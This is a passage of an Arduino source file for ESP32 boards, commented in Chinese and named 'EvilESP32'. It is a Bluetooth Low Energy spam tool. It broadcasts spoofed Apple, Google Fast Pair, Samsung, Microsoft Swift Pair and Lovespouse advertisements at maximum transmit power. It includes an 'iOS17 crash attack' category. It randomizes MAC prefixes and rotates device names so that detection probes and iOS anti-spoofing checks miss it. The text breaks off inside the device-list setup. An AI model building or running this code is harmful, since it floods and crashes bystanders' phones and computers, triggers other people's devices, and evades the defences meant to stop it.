// ============================================================================
// EvilESP32 — 全品牌BLE广播轮播器（全协议支持版）
// 适配：AirM2M CORE ESP32C3 + Arduino ESP32 2.0.17 + BLE 2.0.0
// 支持协议：Apple Continuity、Google Fast Pair、Samsung Easy Setup、Lovespouse、Microsoft Swift Pair
// ============================================================================
#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <esp_system.h>
#include <esp_bt.h>
#include <esp_gap_ble_api.h>
#include <driver/gpio.h>


#include "devices.hpp"

// GCC 编译器优化选项
#pragma GCC optimize ("O3")           // 最高级优化，提升运行速度
#pragma GCC optimize ("unroll-loops") // 循环展开，减少分支跳转
#pragma GCC optimize ("omit-frame-pointer") // 省略帧指针，减少栈操作

// ==================== 日志开关配置 ====================
// 设置为 1 开启串口日志输出，设置为 0 关闭日志以节省 Flash 和 RAM
#define ENABLE_LOG 1

// ==================== 广播参数配置 ====================
#define BROADCAST_DELAY_MIN_MS 100      // 设备广播间隔最小值（毫秒），确保目标设备有足够时间接收弹窗
#define BROADCAST_DELAY_MAX_MS 200    // 设备广播间隔最大值（毫秒）
#define ADV_MIN_INTERVAL       0x0040  // BLE广播最小间隔
#define ADV_MAX_INTERVAL       0x0060  // BLE广播最大间隔
#define BLE_INIT_RETRY_MAX     10      // BLE初始化最大重试次数（射频干扰时自动重试）
#define MAX_DEVICES            1000    // 设备列表最大容量（预分配静态数组）

// ==================== 最大功率配置（按芯片型号） ====================
// 根据不同 ESP32 系列芯片设置最大发射功率，提升广播覆盖范围
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
  #define MAX_TX_POWER_LVL ESP_PWR_LVL_P21  // ESP32C3/C2/S3: +21dBm
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
  #define MAX_TX_POWER_LVL ESP_PWR_LVL_P20  // ESP32H2/C6: +20dBm
#else
  #define MAX_TX_POWER_LVL ESP_PWR_LVL_P9   // 其他型号: +9dBm
#endif

// ==================== LED 引脚与控制宏 ====================
#define RIGHT_LED_GPIO GPIO_NUM_12          // 右侧 LED 引脚（苹果设备指示）
#define LEFT_LED_GPIO  GPIO_NUM_13          // 左侧 LED 引脚（安卓设备指示）
#define LED_ENABLE     0                    // LED 功能开关（0=关闭，1=开启）

#define LED_ON(gpio)  gpio_set_level(gpio, 1)  // LED 点亮宏
#define LED_OFF(gpio) gpio_set_level(gpio, 0)  // LED 熄灭宏



// ==================== 设备类型枚举 ====================
// 按类别分组：苹果→安卓→电脑→其他，用于交错轮询和LED指示
enum DeviceCategory : uint8_t {
  // ========== 苹果设备 (0-4) ==========
  CATEGORY_APPLE_START = 0,             // 苹果类别起始索引
  DEVICE_APPLE_AUDIO_SETUP = 0,         // 苹果音频设备/AirPods/AppleTV设置
  DEVICE_APPLE_ACTION_MODAL = 1,        // 苹果动作弹窗（NFC扫描效果）
  DEVICE_APPLE_IOS17_CRASH = 2,         // 苹果iOS17崩溃攻击
  DEVICE_APPLE_AIRTAG = 3,              // 苹果Airtag查找弹窗
  DEVICE_APPLE_NOT_YOUR_DEVICE = 4,     // 苹果"非你的设备"弹窗
  CATEGORY_APPLE_END = 4,               // 苹果类别结束索引

  // ========== 安卓设备 (5-10) ==========
  CATEGORY_ANDROID_START = 5,           // 安卓类别起始索引
  DEVICE_ANDROID_FAST_PAIR = 5,         // Google Fast Pair（快速配对）
  DEVICE_ANDROID_FAST_PAIR_DEBUG = 6,   // Fast Pair 调试模式设备
  DEVICE_ANDROID_FAST_PAIR_NON_PROD = 7,// Fast Pair 非生产环境设备
  DEVICE_ANDROID_FAST_PAIR_PHONE = 8,   // Fast Pair 手机设置设备
  DEVICE_ANDROID_SAMSUNG_BUDS = 9,      // 三星耳机 Easy Setup
  DEVICE_ANDROID_SAMSUNG_WATCH = 10,    // 三星手表 Easy Setup
  CATEGORY_ANDROID_END = 10,            // 安卓类别结束索引

  // ========== 电脑设备 (11) ==========
  CATEGORY_PC_START = 11,               // 电脑类别起始索引
  DEVICE_PC_MICROSOFT_SWIFT_PAIR = 11,  // Microsoft Swift Pair（Windows快速配对）
  CATEGORY_PC_END = 11,                 // 电脑类别结束索引

  // ========== 其他设备 (12-14) ==========
  CATEGORY_OTHER_START = 12,            // 其他类别起始索引
  DEVICE_OTHER_CUSTOM = 12,             // 用户自定义设备
  DEVICE_OTHER_LOVESPOUSE_PLAY = 13,    // Lovespouse 播放指令
  DEVICE_OTHER_LOVESPOUSE_STOP = 14,    // Lovespouse 停止指令
  CATEGORY_OTHER_END = 14,              // 其他类别结束索引

  DEVICE_CATEGORY_COUNT = 15            // 设备类别总数
};

// ==================== 类别名称数组（日志输出用） ====================
static const char* s_categoryNames[DEVICE_CATEGORY_COUNT] = {
  // 苹果设备
  "苹果-Audio/Setup",       // DEVICE_APPLE_AUDIO_SETUP
  "苹果-动作弹窗",          // DEVICE_APPLE_ACTION_MODAL
  "苹果-iOS17崩溃",         // DEVICE_APPLE_IOS17_CRASH
  "苹果-Airtag",            // DEVICE_APPLE_AIRTAG
  "苹果-非你的设备",        // DEVICE_APPLE_NOT_YOUR_DEVICE
  // 安卓设备
  "安卓-Fast Pair",         // DEVICE_ANDROID_FAST_PAIR
  "安卓-调试设备",          // DEVICE_ANDROID_FAST_PAIR_DEBUG
  "安卓-非生产设备",        // DEVICE_ANDROID_FAST_PAIR_NON_PROD
  "安卓-手机设置",          // DEVICE_ANDROID_FAST_PAIR_PHONE
  "安卓-三星耳机",          // DEVICE_ANDROID_SAMSUNG_BUDS
  "安卓-三星手表",          // DEVICE_ANDROID_SAMSUNG_WATCH
  // 电脑设备
  "电脑-Windows",           // DEVICE_PC_MICROSOFT_SWIFT_PAIR
  // 其他设备
  "其他-自定义",            // DEVICE_OTHER_CUSTOM
  "其他-Lovespouse播放",    // DEVICE_OTHER_LOVESPOUSE_PLAY
  "其他-Lovespouse停止",    // DEVICE_OTHER_LOVESPOUSE_STOP
};

// ==================== 类别统计变量 ====================
static int s_categoryCounts[DEVICE_CATEGORY_COUNT] = {0};    // 每个类别的设备数量
static int s_categoryStartIdx[DEVICE_CATEGORY_COUNT] = {0};  // 每个类别在设备列表中的起始索引

// ==================== 大类分组结构体 ====================
// 将多个小类别组合成四大类，实现交错轮询（苹果→安卓→电脑→其他）
typedef struct {
  int startCategory;  // 该大类包含的起始类别索引
  int endCategory;    // 该大类包含的结束类别索引
  int totalCount;     // 该大类的设备总数
  int currentIdx;     // 当前轮询到的偏移位置
  const char* name;   // 大类名称（日志输出用）
} CategoryGroup;

// 四大类分组配置
static CategoryGroup s_categoryGroups[] = {
  {CATEGORY_APPLE_START, CATEGORY_APPLE_END, 0, 0, "苹果设备"},
  {CATEGORY_ANDROID_START, CATEGORY_ANDROID_END, 0, 0, "安卓设备"},
  {CATEGORY_PC_START, CATEGORY_PC_END, 0, 0, "电脑设备"},
  {CATEGORY_OTHER_START, CATEGORY_OTHER_END, 0, 0, "其他设备"}
};
static const int NUM_GROUPS = sizeof(s_categoryGroups) / sizeof(s_categoryGroups[0]);  // 大类数量（4个）

// ==================== 预计算设备映射表（O(1)查找优化） ====================
// groupDeviceMap[groupIdx][offset] = deviceListIndex
// 预计算每个大类内的设备在 s_deviceList 中的索引
// 消除 findNextDeviceInGroup 的运行时循环查找，将复杂度从 O(n) 降为 O(1)
static int s_groupDeviceMap[NUM_GROUPS][MAX_DEVICES] = {{0}};

// ==================== 统一设备描述符（所有协议共用） ====================
// 使用 __attribute__((packed, aligned(4))) 优化内存布局，减少缓存行浪费
struct __attribute__((packed, aligned(4))) DeviceDesc {
  const char* name;                      // 设备名称（日志输出用）
  void (*filler)(BLEAdvertisementData&, const void*);  // 广播包填充函数指针
  const void* data;                      // 设备私有数据指针（指向具体设备结构体）
  uint8_t pduType;                       // PDU类型（0=非连接可发现广播，1=可连接广播）
  DeviceCategory category;               // 设备类别（用于LED指示和分组）
};

// ==================== 全局静态变量 ====================
static DeviceDesc s_deviceList[MAX_DEVICES] __attribute__((aligned(32)));  // 设备列表（32字节对齐优化缓存）
static BLEAdvertising* s_advertising = nullptr;                            // BLE广播控制器指针
static BLEServer* s_pServer = nullptr;   // 全局 BLE Server 指针
static bool s_isInitialized = false;                                       // 系统初始化标志
static int s_totalDevices = 0;                                             // 设备总数
static int s_roundCount = 0;                                               // 广播轮次计数器
static int s_globalRoundIdx = 0;                                           // 全局轮询位置（决定当前从哪个大类取设备）
static int s_groupCurrentIdx[NUM_GROUPS] = {0};                            // 每个大类的当前轮询索引
static int s_devicesBroadcastThisRound = 0;                                // 本轮已广播设备数

// ==================== 日志宏（根据 ENABLE_LOG 开关编译） ====================
#if ENABLE_LOG == 1
  // LOG: 带时间戳的通用日志输出
  #define LOG(fmt, ...) Serial.printf("[%lu] " fmt "\n", millis(), ##__VA_ARGS__)
  // LOG_DEVICE: 设备广播日志，包含类别、设备名、进度
  #define LOG_DEVICE(cat, name, idx, total) Serial.printf("[%lu] [%s] 广播设备: %s (%d/%d)\n", millis(), cat, name, idx, total)
#else
  // 日志关闭时，宏展开为空语句，编译器会优化掉
  #define LOG(...) do {} while(0)
  #define LOG_DEVICE(...) do {} while(0)
#endif

// ==================== Xorshift32 快速伪随机数生成器 ====================
// 替代 esp_random()，性能提升约 50%，适合高频调用场景
static uint32_t s_rngState = 0;  // 随机数种子（将在 setup() 中使用 esp_random() 初始化）

// Xorshift32 核心算法：通过三次位移异或操作生成伪随机数
static inline uint32_t xorshift32() {
  s_rngState ^= s_rngState << 13;  // 左移13位并异或
  s_rngState ^= s_rngState >> 17;  // 右移17位并异或
  s_rngState ^= s_rngState << 5;   // 左移5位并异或
  return s_rngState;
}

// 随机数获取接口
static inline uint32_t fastRandom() {
  return xorshift32();
}

// 获取随机广播延迟（微秒）
// 在 [BROADCAST_DELAY_MIN_MS, BROADCAST_DELAY_MAX_MS] 范围内生成随机延迟
// 每个设备使用独立延迟，避免空中碰撞，使广播包呈泊松分布
/*
static inline uint32_t getRandomDelayUs() {
  uint32_t ms = BROADCAST_DELAY_MIN_MS + (fastRandom() % (BROADCAST_DELAY_MAX_MS - BROADCAST_DELAY_MIN_MS + 1));
  return ms * 1000UL;  // 转换为微秒
}
*/


// ==================== 生成 BLE 合规静态随机 MAC（多样化前缀） ====================
// 打破固定 0xC0 前缀特征，使用 16 种不同前缀（0xC0, 0xC2, ..., 0xDE）
// 避免被商业探针（如鲸鱼、探知）识别为"蓝牙欺诈器"加入黑名单
static void generateRandomMac(esp_bd_addr_t addr) {
  uint32_t r1 = fastRandom();
  uint32_t r2 = fastRandom();
  
  // 16种合法的静态随机MAC前缀（bit6=0, bit7=1）
  //uint8_t prefixOptions[] = {0xC0, 0xC2, 0xC4, 0xC6, 0xC8, 0xCA, 0xCC, 0xCE,
  //                           0xD0, 0xD2, 0xD4, 0xD6, 0xD8, 0xDA, 0xDC, 0xDE};

    // 64种合法的静态随机MAC前缀（0xC0~0xFF 全部合法）
  uint8_t prefixOptions[] = {
      0xC0,0xC1,0xC2,0xC3,0xC4,0xC5,0xC6,0xC7,
      0xC8,0xC9,0xCA,0xCB,0xCC,0xCD,0xCE,0xCF,
      0xD0,0xD1,0xD2,0xD3,0xD4,0xD5,0xD6,0xD7,
      0xD8,0xD9,0xDA,0xDB,0xDC,0xDD,0xDE,0xDF,
      0xE0,0xE1,0xE2,0xE3,0xE4,0xE5,0xE6,0xE7,
      0xE8,0xE9,0xEA,0xEB,0xEC,0xED,0xEE,0xEF,
      0xF0,0xF1,0xF2,0xF3,0xF4,0xF5,0xF6,0xF7,
      0xF8,0xF9,0xFA,0xFB,0xFC,0xFD,0xFE,0xFF
  };
  uint8_t prefixIdx = (r1 >> 26) & 0x3F;  // 取高6位，范围0~63
  //uint8_t prefixIdx = (r1 >> 28) & 0x0F;  // 取高4位作为前缀索引
  addr[0] = prefixOptions[prefixIdx];     // 设置随机前缀
  
  addr[1] = (r1 >> 16) & 0xFF;           // MAC地址第2字节
  addr[2] = (r1 >> 8)  & 0xFF;           // MAC地址第3字节
  addr[3] = r1 & 0xFF;                   // MAC地址第4字节
  addr[4] = (r2 >> 24) & 0xFF;           // MAC地址第5字节
  addr[5] = (r2 >> 16) & 0xFF;           // MAC地址第6字节
}

// ==================== PDU 类型设置 ====================
// 根据设备类型选择合适的广播类型
// pduType=1: ADV_TYPE_IND（可连接广播，用于Fast Pair等需要连接的协议）
// pduType=0: ADV_TYPE_NONCONN_IND（非连接广播，用于Apple等单向广播协议）
static void setOptimalPduType(BLEAdvertising* adv, uint8_t pduType) {
  adv->setAdvertisementType(pduType == 1 ? ADV_TYPE_IND : ADV_TYPE_NONCONN_IND);
}

// ==================== 广播数据填充函数（协议适配层） ====================
// 每个函数负责将特定协议的设备数据转换为 BLE 广播包格式
// 填充流程：调用对应的 generateXXXPacket 生成原始数据包 -> 添加到 BLEAdvertisementData

// 苹果音频/设置设备广播包填充
static void fillApplePacket(BLEAdvertisementData& ad, const void* devPtr) {
  const AppleDevice* dev = static_cast<const AppleDevice*>(devPtr);
  uint8_t packet[APPLE_AUDIO_PACKET_LEN];
  size_t len;
  generatePacket(*dev, packet, len);
  ad.addData(std::string(reinterpret_cast<char*>(packet), len));
}

// Google Fast Pair 设备广播包填充
static void fillFastPairPacket(BLEAdvertisementData& ad, const void* devPtr) {
  const FastPairDevice* dev = static_cast<const FastPairDevice*>(devPtr);
  uint8_t packet[FAST_PAIR_PACKET_LEN];
  size_t len;
  generateFastPairPacket(*dev, packet, len);
  ad.addData(std::string(reinterpret_cast<char*>(packet), len));
}

// 自定义设备广播包填充（复用 AppleDevice 结构体）
static void fillCustomPacket(BLEAdvertisementData& ad, const void* devPtr) {
  const CustomDevice* dev = static_cast<const CustomDevice*>(devPtr);
  uint8_t packet[APPLE_AUDIO_PACKET_LEN];
  size_t len;
  generateCustomPacket(*dev, packet, len);
  ad.addData(std::string(reinterpret_cast<char*>(packet), len));
}

// 苹果动作弹窗设备广播包填充
static void fillAppleActionModalPacket(BLEAdvertisementData& ad, const void* devPtr) {
  const AppleActionModalDevice* dev = static_cast<const AppleActionModalDevice*>(devPtr);
  uint8_t packet[APPLE_ACTION_MODAL_LEN];
  size_t len;
  generateAppleActionModalPacket(*dev, packet, len);
  ad.addData(std::string(reinterpret_cast<char*>(packet), len));
}

// 苹果iOS17崩溃设备广播包填充
static void fillAppleIos17CrashPacket(BLEAdvertisementData& ad, const void* devPtr) {
  const AppleIos17CrashDevice* dev = static_cast<const AppleIos17CrashDevice*>(devPtr);
  uint8_t packet[APPLE_IOS17_CRASH_LEN];
  size_t len;
  generateAppleIos17CrashPacket(*dev, packet, len);
  ad.addData(std::string(reinterpret_cast<char*>(packet), len));
}

// 苹果Airtag设备广播包填充
static void fillAppleAirtagPacket(BLEAdvertisementData& ad, const void* devPtr) {
  const AppleAirtagDevice* dev = static_cast<const AppleAirtagDevice*>(devPtr);
  uint8_t packet[APPLE_AIRTAG_PACKET_LEN];
  size_t len;
  generateAppleAirtagPacket(*dev, packet, len);
  ad.addData(std::string(reinterpret_cast<char*>(packet), len));
}

// 苹果"非你的设备"广播包填充
static void fillAppleNotYourDevicePacket(BLEAdvertisementData& ad, const void* devPtr) {
  const AppleNotYourDevice* dev = static_cast<const AppleNotYourDevice*>(devPtr);
  uint8_t packet[APPLE_NOT_YOUR_DEVICE_LEN];
  size_t len;
  generateAppleNotYourDevicePacket(*dev, packet, len);
  ad.addData(std::string(reinterpret_cast<char*>(packet), len));
}

// 三星耳机 Easy Setup 广播包填充
static void fillSamsungBudsPacket(BLEAdvertisementData& ad, const void* devPtr) {
  const SamsungBudsDevice* dev = static_cast<const SamsungBudsDevice*>(devPtr);
  uint8_t packet[SAMSUNG_BUDS_PACKET_LEN];
  size_t len;
  generateSamsungBudsPacket(*dev, packet, len);
  ad.addData(std::string(reinterpret_cast<char*>(packet), len));
}

// 三星手表 Easy Setup 广播包填充
static void fillSamsungWatchPacket(BLEAdvertisementData& ad, const void* devPtr) {
  const SamsungWatchDevice* dev = static_cast<const SamsungWatchDevice*>(devPtr);
  uint8_t packet[SAMSUNG_WATCH_PACKET_LEN];
  size_t len;
  generateSamsungWatchPacket(*dev, packet, len);
  ad.addData(std::string(reinterpret_cast<char*>(packet), len));
}

// Lovespouse 设备广播包填充（播放/停止指令）
static void fillLovespousePacket(BLEAdvertisementData& ad, const void* devPtr) {
  const LovespouseDevice* dev = static_cast<const LovespouseDevice*>(devPtr);
  uint8_t packet[LOVESPOUSE_PACKET_LEN];
  size_t len;
  generateLovespousePacket(*dev, packet, len);
  ad.addData(std::string(reinterpret_cast<char*>(packet), len));
}

// Microsoft Swift Pair 广播包填充
static void fillSwiftPairPacket(BLEAdvertisementData& ad, const void* devPtr) {
  const SwiftPairDevice* dev = static_cast<const SwiftPairDevice*>(devPtr);
  uint8_t packet[SWIFT_PAIR_PACKET_LEN];
  size_t len;
  generateSwiftPairPacket(*dev, packet, len);
  ad.addData(std::string(reinterpret_cast<char*>(packet), len));
}

// ==================== 真实设备名称池（反欺骗用） ====================
// 收集市面上常见的真无线耳机和智能手环名称
// 每发送一个广播包就随机更换一个名称，模拟"多个真实设备轮换"
// 对抗 iOS 17+ 的反欺骗指纹机制（统计同一 MAC/RSSI 下的设备名称变化频率）
static const char* s_deviceNamePool[] = {
  "FreeBuds SE", "FreeBuds 5i", "FreeBuds 6i", "FreeBuds Pro 2", "FreeBuds Pro 3",
  "Earbuds X5", "Earbuds X6", "Earbuds 3 Pro", "Earbuds X7",
  "Redmi Buds 4", "Redmi Buds 5", "Xiaomi Buds 4", "Xiaomi Buds 5",
  "Enco Air3", "Enco Free3", "OnePlus Buds",
  "Lolli Pods", "Zero Air", "TWS1 Pro","Galaxy Buds2", "Galaxy Buds Pro", "Soundcore Liberty 4",
  "Jabra Elite 10", "Sony LinkBuds S", "Bose QC Ultra",
  "Nothing Ear (2)", "Oppo Enco X2", "Xiaomi Buds 3"
};
#define NAME_POOL_COUNT (sizeof(s_deviceNamePool) / sizeof(s_deviceNamePool[0]))  // 名称池大小

// ==================== 动态更换 GATT 设备名 ====================
// 每次广播前随机更换设备名称，提高反侦测能力
// 50%概率在名称后追加一个十六进制数字，增加名称多样性
static void updateRandomDeviceName() {
  uint32_t nameIdx = fastRandom() % NAME_POOL_COUNT;         // 随机选择一个基础名称
  const char* baseName = s_deviceNamePool[nameIdx];
  if (fastRandom() & 0x01) {                                 // 50%概率追加数字后缀
    char nameBuf[16];
    snprintf(nameBuf, sizeof(nameBuf), "%s %X", baseName, fastRandom() & 0x0F);  // 追加0-F
    esp_ble_gap_set_device_name(nameBuf);
  } else {
    esp_ble_gap_set_device_name(baseName);                   // 使用原始名称
  }
}

// ==================== 初始化设备列表（全协议设备加载） ====================
// 将所有协议的设备加载到统一的 s_deviceList 数组中
// 每个设备包含：名称、填充函数指针、私有数据指针、PDU类型、类别
static void initDeviceList() {
  int idx = 0;  // 当前设备列表索引

  // ========== 第一组：苹果设备（5个子类别） ==========
  LOG(">>> 加载苹果设备...");

  // Apple Audio/Setup（音频设备+AppleTV设置等）
  s_categoryStartIdx[DEVICE_APPLE_AUDIO_SETUP] = idx;
  for (int i = 0; i < NUM_APPLE_DEVICES && idx < MAX_DEVICES; i++, idx++) {
    s_deviceList[idx].name     = ALL_DEVICES[i].name;
    s_deviceList[idx].filler   = fillApplePacket;
    s_deviceList[idx].data     = &ALL_DEVICES[i];
    s_deviceList[idx].pduType  = 0;  // 非连接广播
    s_deviceList[idx].category = DEVICE_APPLE_AUDIO_SETUP;
  }
  s_categoryCounts[DEVICE_APPLE_AUDIO_SETUP] = idx - s_categoryStartIdx[DEVICE_APPLE_AUDIO_SETUP];
  LOG("    [苹果-Audio/Setup] 加载 %d 个设备", s_categoryCounts[DEVICE_APPLE_AUDIO_SETUP]);

  // Apple Action Modal（动作弹窗，模拟NFC扫描效果）
  s_categoryStartIdx[DEVICE_APPLE_ACTION_MODAL] = idx;
  for (int i = 0; i < NUM_APPLE_ACTION_MODAL_DEVICES && idx < MAX_DEVICES; i++, idx++) {
    s_deviceList[idx].name     = APPLE_ACTION_MODAL_DEVICES[i].name;
    s_deviceList[idx].filler   = fillAppleActionModalPacket;
    s_deviceList[idx].data     = &APPLE_ACTION_MODAL_DEVICES[i];
    s_deviceList[idx].pduType  = 0;  // 非连接广播
    s_deviceList[idx].category = DEVICE_APPLE_ACTION_MODAL;
  }
  s_categoryCounts[DEVICE_APPLE_ACTION_MODAL] = idx - s_categoryStartIdx[DEVICE_APPLE_ACTION_MODAL];
  LOG("    [苹果-动作弹窗] 加载 %d 个设备", s_categoryCounts[DEVICE_APPLE_ACTION_MODAL]);

  // Apple iOS17 Crash（iOS17崩溃攻击）
  s_categoryStartIdx[DEVICE_APPLE_IOS17_CRASH] = idx;
  for (int i = 0; i < NUM_APPLE_IOS17_CRASH_DEVICES && idx < MAX_DEVICES; i++, idx++) {
    s_deviceList[idx].name     = APPLE_IOS17_CRASH_DEVICES[i].name;
    s_deviceList[idx].filler   = fillAppleIos17CrashPacket;
    s_deviceList[idx].data     = &APPLE_IOS17_CRASH_DEVICES[i];
    s_deviceList[idx].pduType  = 0;  // 非连接广播
    s_deviceList[idx].category = DEVICE_APPLE_IOS17_CRASH;
  }
  s_categoryCounts[DEVICE_APPLE_IOS17_CRASH] = idx - s_categoryStartIdx[DEVICE_APPLE_IOS17_CRASH];
  LOG("    [苹果-iOS17崩溃] 加载 %d 个设备", s_categoryCounts[DEVICE_APPLE_IOS17_CRASH]);

  // Apple Airtag（查找弹窗）
  s_categoryStartIdx[DEVICE_APPLE_AIRTAG] = idx;
  for (int i = 0; i < NUM_APPLE_AIRTAG_DEVICES && idx < MAX_DEVICES; i++, idx++) {
    s_deviceList[idx].name     = APPLE_AIRTAG_DEVICES[i].name;
    s_deviceList[idx].filler   = fillAppleAirtagPacket;
    s_deviceList[idx].data     = &APPLE_AIRTAG_DEVICES[i];
    s_deviceList[idx].pduType  = 0;  // 非连接广播
    s_deviceList[idx].category = DEVICE_APPLE_AIRTAG;
  }
  s_categoryCounts[DEVICE_APPLE_AIRTAG] = idx - s_categoryStartIdx[DEVICE_APPLE_AIRTAG];
  LOG("    [苹果-Airtag] 加载 %d 个设备", s_categoryCounts[DEVICE_APPLE_AIRTAG]);

  // Apple Not Your Device（"非你的设备"弹窗，含颜色变体）
  s_categoryStartIdx[DEVICE_APPLE_NOT_YOUR_DEVICE] = idx;
  for (int i = 0; i < NUM_APPLE_NOT_YOUR_DEVICE_DEVICES && idx < MAX_DEVICES; i++, idx++) {
    s_deviceList[idx].name     = APPLE_NOT_YOUR_DEVICE_DEVICES[i].name;
    s_deviceList[idx].filler   = fillAppleNotYourDevicePacket;
    s_deviceList[idx].data     = &APPLE_NOT_YOUR_DEVICE_DEVICES[i];
    s_deviceList[idx].pduType  = 0;  // 非连接广播
    s_deviceList[idx].category = DEVICE_APPLE_NOT_YOUR_DEVICE;
  }
  s_categoryCounts[DEVICE_APPLE_NOT_YOUR_DEVICE] = idx - s_categoryStartIdx[DEVICE_APPLE_NOT_YOUR_DEVICE];
  LOG("    [苹果-非你的设备] 加载 %d 个设备", s_categoryCounts[DEVICE_APPLE_NOT_YOUR_DEVICE]);

  // 统计苹果设备总数
  int appleTotal = 0;
  for (int c = CATEGORY_APPLE_START; c <= CATEGORY_APPLE_END; c++) appleTotal += s_categoryCounts[c];
  LOG(">>> 苹果设备总计: %d 个", appleTotal);

  // ========== 第二组：安卓设备（6个子类别） ==========
  LOG(">>> 加载安卓设备...");

  // Google Fast Pair（快速配对，467个设备）
  s_categoryStartIdx[DEVICE_ANDROID_FAST_PAIR] = idx;
  for (int i = 0; i < NUM_FASTPAIR_DEVICES && idx < MAX_DEVICES; i++, idx++) {
    s_deviceList[idx].name     = FAST_PAIR_DEVICES[i].name;
    s_deviceList[idx].filler   = fillFastPairPacket;
    s_deviceList[idx].data     = &FAST_PAIR_DEVICES[i];
    s_deviceList[idx].pduType  = 1;  // <--- 原来是 0，改为 1（可连接）
    s_deviceList[idx].category = DEVICE_ANDROID_FAST_PAIR;
  }
  s_categoryCounts[DEVICE_ANDROID_FAST_PAIR] = idx - s_categoryStartIdx[DEVICE_ANDROID_FAST_PAIR];
  LOG("    [安卓-Fast Pair] 加载 %d 个设备", s_categoryCounts[DEVICE_ANDROID_FAST_PAIR]);

  // Fast Pair Debug（调试模式设备）
  s_categoryStartIdx[DEVICE_ANDROID_FAST_PAIR_DEBUG] = idx;
  for (int i = 0; i < NUM_FAST_PAIR_DEBUG_DEVICES && idx < MAX_DEVICES; i++, idx++) {
    s_deviceList[idx].name     = FAST_PAIR_DEBUG_DEVICES[i].name;
    s_deviceList[idx].filler   = fillFastPairPacket;
    s_deviceList[idx].data     = &FAST_PAIR_DEBUG_DEVICES[i];
    s_deviceList[idx].pduType  = 1;  // <--- 原来是 0，改为 1（可连接）
    s_deviceList[idx].category = DEVICE_ANDROID_FAST_PAIR_DEBUG;
  }
  s_categoryCounts[DEVICE_ANDROID_FAST_PAIR_DEBUG] = idx - s_categoryStartIdx[DEVICE_ANDROID_FAST_PAIR_DEBUG];
  LOG("    [安卓-调试设备] 加载 %d 个设备", s_categoryCounts[DEVICE_ANDROID_FAST_PAIR_DEBUG]);

  // Fast Pair Non Production（非生产环境设备）
  s_categoryStartIdx[DEVICE_ANDROID_FAST_PAIR_NON_PROD] = idx;
  for (int i = 0; i < NUM_FAST_PAIR_NON_PRODUCTION_DEVICES && idx < MAX_DEVICES; i++, idx++) {
    s_deviceList[idx].name     = FAST_PAIR_NON_PRODUCTION_DEVICES[i].name;
    s_deviceList[idx].filler   = fillFastPairPacket;
    s_deviceList[idx].data     = &FAST_PAIR_NON_PRODUCTION_DEVICES[i];
    s_deviceList[idx].pduType  = 1;  // <--- 原来是 0，改为 1（可连接）
    s_deviceList[idx].category = DEVICE_ANDROID_FAST_PAIR_NON_PROD;
  }
  s_categoryCounts[DEVICE_ANDROID_FAST_PAIR_NON_PROD] = idx - s_categoryStartIdx[DEVICE_ANDROID_FAST_PAIR_NON_PROD];
  LOG("    [安卓-非生产设备] 加载 %d 个设备", s_categoryCounts[DEVICE_ANDROID_FAST_PAIR_NON_PROD]);

  // Fast Pair Phone Setup（手机设置设备）
  s_categoryStartIdx[DEVICE_ANDROID_FAST_PAIR_PHONE] = idx;
  for (int i = 0; i < NUM_FAST_PAIR_PHONE_SETUP_DEVICES && idx < MAX_DEVICES; i++, idx++) {
    s_deviceList[idx].name     = FAST_PAIR_PHONE_SETUP_DEVICES[i].name;
    s_deviceList[idx].filler   = fillFastPairPacket;
    s_deviceList[idx].data     = &FAST_PAIR_PHONE_SETUP_DEVICES[i];
    s_deviceList[idx].pduType  = 1;  // <--- 原来是 0，改为 1（可连接）
    s_deviceList[idx].category = DEVICE_ANDROID_FAST_PAIR_PHONE;
  }
  s_categoryCounts[DEVICE_ANDROID_FAST_PAIR_PHONE] = idx - s_categoryStartIdx[DEVICE_ANDROID_FAST_PAIR_PHONE];
  LOG("    [安卓-手机设置] 加载 %d 个设备", s_categoryCounts[DEVICE_ANDROID_FAST_PAIR_PHONE]);

  // Samsung Buds（三星耳机 Easy Setup）
  s_categoryStartIdx[DEVICE_ANDROID_SAMSUNG_BUDS] = idx;
  for (int i = 0; i < NUM_SAMSUNG_BUDS_DEVICES && idx < MAX_DEVICES; i++, idx++) {
    s_deviceList[idx].name     = SAMSUNG_BUDS_DEVICES[i].name;
    s_deviceList[idx].filler   = fillSamsungBudsPacket;
    s_deviceList[idx].data     = &SAMSUNG_BUDS_DEVICES[i];
    s_deviceList[idx].pduType  = 0;  // 非连接广播
    s_deviceList[idx].category = DEVICE_ANDROID_SAMSUNG_BUDS;
  }
  s_categoryCounts[DEVICE_ANDROID_SAMSUNG_BUDS] = idx - s_categoryStartIdx[DEVICE_ANDROID_SAMSUNG_BUDS];
  LOG("    [安卓-三星耳机] 加载 %d 个设备", s_categoryCounts[DEVICE_ANDROID_SAMSUNG_BUDS]);

  // Samsung Watch（三星手表 Easy Setup）
  s_categoryStartIdx[DEVICE_ANDROID_SAMSUNG_WATCH] = idx;
  for (int i = 0; i < NUM_SAMSUNG_WATCH_DEVICES && idx < MAX_DEVICES; i++, idx++) {
    s_deviceList[idx].name     = SAMSUNG_WATCH_DEVICES[i].name;
    s_deviceList[idx].filler   = fillSamsungWatchPacket;
    s_deviceList[idx].data     = &SAMSUNG_WATCH_DEVICES[i];
    s_deviceList[idx].pduType  = 0;  // 非连接广播
    s_deviceList[idx].category = DEVICE_ANDROID_SAMSUNG_WATCH;
  }
  s_categoryCounts[DEVICE_ANDROID_SAMSUNG_WATCH] = idx - s_categoryStartIdx[DEVICE_ANDROID_SAMSUNG_WATCH];
  LOG("    [安卓-三星手表] 加载 %d 个设备", s_categoryCounts[DEVICE_ANDROID_SAMSUNG_WATCH]);

  // 统计安卓设备总数
  int androidTotal = 0;
  for (int c = CATEGORY_ANDROID_START; c <= CATEGORY_ANDROID_END; c++) androidTotal += s_categoryCounts[c];
  LOG(">>> 安卓设备总计: %d 个", androidTotal);

  // ========== 第三组：电脑设备（1个子类别） ==========
  LOG(">>> 加载电脑设备...");

  // Microsoft Swift Pair（Windows快速配对）
  s_categoryStartIdx[DEVICE_PC_MICROSOFT_SWIFT_PAIR] = idx;
  for (int i = 0; i < NUM_SWIFT_PAIR_DEVICES && idx < MAX_DEVICES; i++, idx++) {
    s_deviceList[idx].name     = SWIFT_PAIR_DEVICES[i].name;
    s_deviceList[idx].filler   = fillSwiftPairPacket;
